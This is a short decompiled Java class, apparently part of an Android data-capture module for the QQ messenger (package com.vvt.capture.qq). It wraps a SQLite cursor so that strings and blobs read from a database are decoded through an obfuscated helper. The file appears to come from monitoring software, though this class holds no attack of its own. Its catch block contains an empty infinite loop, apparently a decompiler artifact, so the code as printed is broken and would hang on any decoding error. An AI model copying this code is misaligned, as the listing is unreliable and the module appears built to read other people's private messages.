package com.vvt.capture.qq;

import android.database.sqlite.SQLiteCursor;
import android.database.sqlite.SQLiteCursorDriver;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQuery;

public class d
  extends SQLiteCursor
{
  private d(SQLiteDatabase paramSQLiteDatabase, SQLiteCursorDriver paramSQLiteCursorDriver, String paramString, SQLiteQuery paramSQLiteQuery)
  {
    super(paramSQLiteDatabase, paramSQLiteCursorDriver, paramString, paramSQLiteQuery);
  }
  
  public String a(int paramInt)
  {
    return super.getString(paramInt);
  }
  
  public byte[] getBlob(int paramInt)
  {
    return g.a(super.getBlob(paramInt));
  }
  
  public String getString(int paramInt)
  {
    String str = super.getString(paramInt);
    try
    {
      str = g.a(str, false);
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    return str;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */